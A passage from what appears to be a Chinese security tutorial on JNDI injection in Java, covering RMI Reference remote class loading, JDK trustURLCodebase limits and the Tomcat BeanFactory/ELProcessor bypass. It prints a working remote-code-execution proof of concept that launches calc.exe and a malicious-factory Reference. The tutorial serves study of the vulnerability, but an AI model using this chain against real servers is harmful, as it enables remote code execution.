        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span>word<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">?</span><span class="token string">&quot;Hi&quot;</span><span class="token operator">:</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>服务端,这里结合RMI协议，通过ReferenceWrapper把一个Reference对象包装成Remote对象</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">21099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//这里的Reference ClassName并不一定要完全匹配</span>
<span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;xyz.eki.vuljndi.remote.xDemo&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;xyz.eki.vuljndi.remote.DemoFactory&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;http://localhost:16000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">&quot;Foo&quot;</span><span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>客户端</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;rmi://localhost:21099&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;word&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;I'm Eki&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InitialContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Demo</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Demo</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;Foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

obj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>输出<code>I'm Eki</code>,可以看到对应传入<code>getObjectInstance</code>的变量</p> <p><img src="https://md.buptmerak.cn/uploads/upload_4f3b76d31a5c13451b5acbaf2209130d.png" alt=""></p> <p>调试的话首先会看到RegistryContext对传入的<code>Reference Wrapper</code>进行了decode</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://md.buptmerak.cn/uploads/upload_05e397915b16b54e18e35e607e5a89ba.png" alt=""></p> <p>然后调用了NamingManger去生产对象</p> <p><img src="https://md.buptmerak.cn/uploads/upload_b46cd73ad539cfe2884bec52e0901d9f.png" alt=""></p> <p>NamingMangager主要也是去找facotry,调用他的getObjectInstance方法来生成一个对象。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_2d82b737722469fac2f5c48e4347d9f7.png" alt=""></p> <p>这里会根据factoryClassName去factoryClassLocation远程加载工厂类类，利用的也是codbase</p> <p><img src="https://md.buptmerak.cn/uploads/upload_dcc00dfa850c5e21d46cad9bb2855062.png" alt=""></p> <p>这里的<code>helper</code>是<code>VersionHelper</code>，也给我们提供了一种loadClass的思路。</p> <p>同时我们也可以看到在jdk高版本下需要调用者开启</p> <ul><li>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</li> <li>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;); <code>JDK &gt;= 11.0.1、8u191、7u201、6u211</code></li></ul> <p>一个是过getFactoryClass的<code>trustURLCodebase</code></p> <p><img src="https://md.buptmerak.cn/uploads/upload_875d4cdd147879b01b8c7e79e8df3e8d.png" alt=""></p> <p>另一个是过VersionHelper的<code>TRUST_URL_CODEBASE_PROPERTY</code></p> <p><img src="https://md.buptmerak.cn/uploads/upload_37b2b2b6343977155b0c66511b775ca2.png" alt=""></p> <p>整个一套流程下来攻击思路也很明显了，因为RegistryContext会解析ReferenceWrapper对象成Reference，如果Reference存在Factory的话还会进一步decode，从FactroyURL加载Factory并调用其getObjectInstance返回一个对象。本质上就是从远程加载类，直接开一个恶意类提供服务就行了。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">&quot;whatever&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;EvilClass&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;http://localhost:16000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">&quot;Foo&quot;</span><span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在上面我们看到在高版本jdk下默认关闭了从远程加载<code>ObjectFactory</code>,不过利用本地实现了<code>ObjectFactory</code>方法的类还是可行的</p> <p>最经典的就是<code>org.apache.naming.factory.BeanFactory</code>+<code>javax.el.ELProcessor</code>这条攻击链了</p> <p>具体<code>BeanFactory</code>的源码见下：</p> <p>https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java</p> <p>这里简化代码简单分析一下<code>getObjectInstance</code>方法，首先传入的object必须是<code>org.apache.naming.ResourceRef</code></p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Reference</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>

<span class="token comment">//加载refrence classname对应的类为beanClass,并实例化</span>
<span class="token class-name">String</span> beanClassName <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> beanClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token class-name">ClassLoader</span> tcl <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>tcl <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	beanClass <span class="token operator">=</span> tcl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	beanClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">BeanInfo</span> bi <span class="token operator">=</span> <span class="token class-name">Introspector</span><span class="token punctuation">.</span><span class="token function">getBeanInfo</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">PropertyDescriptor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> pda <span class="token operator">=</span> bi<span class="token punctuation">.</span><span class="token function">getPropertyDescriptors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> bean <span class="token operator">=</span> beanClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//然后找Reference的forceString属性</span>
<span class="token class-name">RefAddr</span> ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;forceString&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Method</span><span class="token punctuation">&gt;</span></span> forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> paramTypes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> setterName<span class="token punctuation">;</span>
<span class="token keyword">int</span> index<span class="token punctuation">;</span>

<span class="token comment">//将对应Reference的forceString属性值以逗号分隔为param</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//尝试将param分割成 x=y 的格式 或者xxx</span>
	index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//case 1: setterName = x param = y</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">//case 2:setterName = setXxxx （Java Bean规范）</span>
		setterName <span class="token operator">=</span> <span class="token string">&quot;set&quot;</span> <span class="token operator">+</span>
					 param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span><span class="token constant">ENGLISH</span><span class="token punctuation">)</span> <span class="token operator">+</span>
					 param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">//这里将beanClass对应的以setterName为名的参数为String类型的方法放进forced Map中，并以param为键值</span>
	forced<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>setterName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">//获取Reference的所有RefAddr，并遍历</span>
<span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RefAddr</span><span class="token punctuation">&gt;</span></span> e <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	ra <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">String</span> propName <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> valueArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">//从forcemap里拿 propName（就是当前RefAddr的Type）对应的方法</span>
	<span class="token class-name">Method</span> method <span class="token operator">=</span> forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
		<span class="token comment">//调用方法参数为value（就是当前RefAddr的Content）</span>
		method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">continue</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//遍历pda就是bean的属性描述</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>pda<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> propType <span class="token operator">=</span> pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getPropertyType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token comment">//只允许调用方法参数为几个基本类String/Double/Character/...且只能有一个参数的方法</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
					   <span class="token operator">||</span> propType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span>
					<span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
			
			<span class="token comment">//拿到对应写属性的方法，调用其方法写属性</span>
			<span class="token class-name">Method</span> setProp <span class="token operator">=</span> pda<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getWriteMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			setProp<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//返回写完属性生成的bean</span>
<span class="token keyword">return</span> bean<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br></div></div><p>根据注释我们也可以指定实际上这个BeanFactory的意图就是利用jndi的Reference机制根据本地配置文件去生成一个Java Bean示例，当然就会涉及到相关属性的写方法调用了</p> <p><img src="https://md.buptmerak.cn/uploads/upload_720b3db14f44b0eabffc0e44a9e2f326.png" alt=""></p> <p>那么我们现在再看这个RCE Poc就很好理解了</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">&quot;javax.el.ELProcessor&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">&quot;org.apache.naming.factory.BeanFactory&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">&quot;forceString&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;x=eval&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">&quot;x&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc.exe']).start()\&quot;)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>实际上就是在<code>BeanFactory</code>里执行了</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span>ELProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc.exe']).start()\&quot;)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>巧妙的借用<code>BeanFactory</code>的功能实现了RCE，当然还可以挖掘出一些其他链，比如浅蓝师傅就在 https://tttang.com/archive/1405/ 这篇文章里介绍了一些。这里简单总结一下利用<code>org.apache.naming.factory.BeanFactory</code>的条件</p> <ul><li>恶意类有public修饰的无参构造方法（getConstructor().newInstance()所限）</li> <li>恶意类有只有一个String.class类型参数的危险方法（paramTypes所限）</li> <li>恶意类有只有一个基本类型参数的满足bean规范的（setXX）危险方法（paramTypes所限）</li></ul> <h2 id="_0x06-jndi-ldap"><a href="#_0x06-jndi-ldap" class="header-anchor">#</a> 0x06 JNDI + LDAP</h2> <h3 id="几个概念"><a href="#几个概念" class="header-anchor">#</a> 几个概念</h3> <ul><li>DN 的英文名称是（distinguished name），可以简单理解为一个路径。</li></ul> <p>路径中一共包含这么几种节点</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>CN      commonName
L       localityName
ST      stateOrProvinceName
O       organizationName
OU      organizationalUnitName
C       countryName
STREET  streetAddress
DC      domainComponent
UID     userid
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>一般来说 CN &lt;- OU &lt;- DC,可能会有多个 OU，多个 DC，但是最后都会定位到最高一级的 DC,这长串字符串放到一起路径也就是就是 DN 了。</p> <h3 id="quickstart"><a href="#quickstart" class="header-anchor">#</a> QuickStart</h3> <p>服务端（使用了<code>unboundid-ldapsdk</code>）：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> main <span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">21389</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
